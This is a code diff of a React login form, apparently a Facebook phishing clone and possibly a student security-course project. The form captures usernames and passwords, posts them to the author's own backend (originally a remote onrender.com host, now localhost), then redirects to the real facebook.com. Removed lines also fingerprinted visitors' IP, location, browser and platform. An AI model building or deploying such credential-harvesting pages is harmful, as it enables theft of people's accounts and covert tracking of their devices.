@@ -10,32 +10,8 @@ const LoginForm = () => {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
 
-  const [ipAddress, setIpAddress] = useState("");
-  const [userAgent, setUserAgent] = useState("");
-  const [location, setLocation] = useState("");
-  const [platform, setPlatform] = useState("");
-
   const [error, setError] = useState("");
   const router = useRouter();
-
-  // Auto-detect client info
-  useEffect(() => {
-    // IP + Location
-    fetch("https://ipapi.co/json")
-      .then((res) => res.json())
-      .then((data) => {
-        setIpAddress(data.ip || "Không xác định");
-        setLocation(`${data.city}, ${data.region}, ${data.country_name}`);
-      })
-      .catch(() => {
-        setIpAddress("Không xác định");
-        setLocation("Không xác định");
-      });
-
-    // User Agent + Platform
-    setUserAgent(navigator.userAgent || "Không xác định");
-    setPlatform(navigator.platform || "Không xác định");
-  }, []);
 
   // Handle login submit
   const handleSubmit = async (e: FormEvent) => {
@@ -43,22 +19,18 @@ const LoginForm = () => {
     setError("");
 
     try {
-      const response = await fetch("https://atbm-13-be.onrender.com/account", {
+      const response = await fetch("http://localhost:3001/api/v1/account", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           username,
           password,
-          ipAddress,
-          userAgent,
-          location,
-          platform,
         }),
       });
 
       const data = await response.json();
 
-      if (data.success) {
+      if (response.status === 201) {
         router.push("https://www.facebook.com/");
       } else {
         setError(data.message || "Đăng nhập thất bại!");
